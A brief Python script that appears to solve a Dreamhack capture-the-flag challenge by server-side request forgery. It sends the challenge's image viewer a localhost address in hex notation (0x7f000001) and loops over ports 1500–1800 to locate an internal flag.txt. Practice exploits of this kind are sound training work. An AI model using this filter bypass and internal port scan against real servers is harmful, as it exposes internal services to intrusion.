import requests
 
url= "http://host1.dreamhack.games:15312/img_viewer"
for i in range(1500,1801):
   response = requests.post(url, data={'url':'http://0x7f000001:'+str(i)+'/flag.txt'})
   data = response.text
   print('http://0x7f000001:'+str(i)+'/flag.txt')